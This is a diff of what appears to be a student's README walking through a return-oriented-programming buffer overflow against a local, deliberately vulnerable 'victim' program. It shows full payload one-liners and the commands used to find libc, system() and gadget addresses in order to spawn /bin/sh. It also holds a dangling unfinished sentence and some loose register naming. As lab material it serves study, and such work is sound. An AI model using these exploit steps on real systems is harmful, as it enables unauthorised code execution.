@@ -5,6 +5,8 @@ Followed tutorial found at: http://crypto.stanford.edu/~blynn/rop/
 ### My environment
 I am running on Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) via Vagrant.
 
+Near the end, I switch to
+
 ### The shell game
 syscall - programmatic way in which a program can request a service from the kernel of the OS.
 
@@ -431,22 +433,92 @@ Finally, we modify the hexdump to perform the attack, which occurs when the inst
 Note that the first 130 zeroes equate to 65 bytes which is just enough to fill the rest of the name buffer after "/bin/sh" and the RBP register. Then the return address is hijacked to point to the gadget of pop RDI and RET. Instruction pointer will jump to (0x7ffff7a1d000+0x22a12) and RSP is incremented to the location after the return address location with value 0x7fffffffe5c0.
 
 When the instruction pointer reaches pop RDI in the gadget, RDI will store the value at the RSP, which will be the address of "/bin/sh" (0x7fffffffe5c0). We need to increment RSP so that it contains the value of (0x7ffff7a1d000+0x44320).
- 
-When the instruction pointer reaches the RET in the gadget, the instruction pointer jumps to where the RSP is (0x7ffff7a1d000+0x44320). Remember that the value at RSP is the location of the system() libc function, so the instruction pointer will jump to there and call it using RDI as a parameter ("/bin/sh"). 
+
+When the instruction pointer reaches the RET in the gadget, the instruction pointer jumps to where the RSP is (0x7ffff7a1d000+0x44320). Remember that the value at RSP is the location of the system() libc function, so the instruction pointer will jump to there and call it using RDI as a parameter ("/bin/sh").
 ```
 vagrant@precise64:~/480-project2$ (echo -n /bin/sh | xxd -p; printf %0130d 0; printf %016x $((0x7ffff7a1d000+0x22a12)) | tac -rs..; printf %016x 0x7fffffffe5c0 | tac -rs..; printf %016x $((0x7ffff7a1d000+0x44320)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim
 0x7fffffffe5c0
 What's your name?
 Hello, /bin/sh!
 
+Segmentation fault (core dumped)
+```
+
+Unfortunately, this solution doesn't work. At the top of the tutorial, it's mentioned that in newer versions of Linux the stack is organized differently. From here on, I am following the tutorial from https://github.com/finallyjustice/security/blob/master/rop/demo1/README.txt:
+
+For this tutorial, I moved to Ubunutu 16.04.1 LTS.
+
+Please note, the new stack layout is:
+
+#### Stack Layout ####
+    string /bin/sh
+----------------------
+    addr of system()
+----------------------
+    addr of /bin/sh
+----------------------
+    addr of pop rdi; ret
+----------------------
+     EBP Register
+----------------------
+     64 bytes buf
+######################
+
+In one terminal:
+
+```
+vagrant@vagrant-ubuntu-trusty-64:~/csc480-project2$ ./victim
+0x7fffffffe5a0
+What's your name?
+```
+
+In another terminal:
+```
+root@vagrant-ubuntu-trusty-64:/home/vagrant/csc480-project2# pid=`ps -C victim -o pid --no-headers | tr -d ' '`
+root@vagrant-ubuntu-trusty-64:/home/vagrant/csc480-project2# grep libc /proc/$pid/maps
+7ffff7a15000-7ffff7bcf000 r-xp 00000000 08:01 2205                       /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7bcf000-7ffff7dcf000 ---p 001ba000 08:01 2205                       /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7dcf000-7ffff7dd3000 r--p 001ba000 08:01 2205                       /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7dd3000-7ffff7dd5000 rw-p 001be000 08:01 2205                       /lib/x86_64-linux-gnu/libc-2.19.so
+root@vagrant-ubuntu-trusty-64:/home/vagrant/csc480-project2#
+root@vagrant-ubuntu-trusty-64:/home/vagrant/csc480-project2# nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
+0000000000046590 W system
+root@vagrant-ubuntu-trusty-64:/home/vagrant/csc480-project2#  xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |
+> grep 5f -m1 | awk '{printf"%x\n",$1-1}'
+22b9a
+```
+
+Our new addresses are:
+
+buffer: 0x7fffffffe5a0
+libc base: 0x7ffff7a15000
+system: 0x7ffff7a15000 + 0x46590
+gadgets: 0x7ffff7a15000 + 0x22b9a
+bash: 0x7fffffffe5a0 + 64d + 8d + 24d = 0x7fffffffe600
+
+In the first terminal, we run the new command:
+```
+vagrant@vagrant-ubuntu-trusty-64:~/csc480-project2$ (((printf %0144d 0; printf %016x $((0x7ffff7a15000+0x22b9a)) | tac -rs..; printf %016x 0x7fffffffe600 | tac -rs..; printf %016x $((0x7ffff7a15000+0x46590)) | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
+0x7fffffffe5a0
+What's your name?
+
+Hello, !
 
 
 ls
-pip  shell  shell.c  shellcode  shell.dSYM  victim  victim.c
+grep  README.md  shell	shell.c  shellcode  shell.dSYM	victim	victim.c
 ```
 
+For the new solution, we fill the buffer and EBP register with 0s. 144 0s equate to 72 bytes, 64 bytes are for the buffer and 8 for the EBP register. The return address is then replaced with the location of the gadget. Next, the address of /bin/sh, which points to the string of "/bin/sh" at the end of our attack statement, which is an offset from the buffer beginning. Note the 24d is specified for the 3x8 bytes, which are the address lengths of the gadget, "/bin/sh", and system(). Finally, the system() address is at the end, right before "/bin/sh".
 
-This video explains the example very nicely except call stack address should be flipped as the ESP is incremented when popping: https://youtu.be/XZa0Yu6i_ew?t=183
+When the main() function returns, the instruction pointer will jump to the location of the code for the gadget. ESP is incremented during popping.
+
+In the gadget, pop RDI will get the value at the location of the stack, which is the address of "bin/sh". ESP is incremented. At retq, the instruction pointer will jump to address of system(). ESP is incremented.
+
+system() will finally execute "/bin/sh" because of the argument in register RDI, which contains the address of "/bin/sh".
+
 
 ### Conclusion
 Despite various security measures placed by the compiler to prevent buffer overflows, we were still able to pull off the attack using return-oriented programming.
+
+This video explains the example very nicely except call stack address should be flipped as the ESP is incremented when popping: https://youtu.be/XZa0Yu6i_ew?t=183
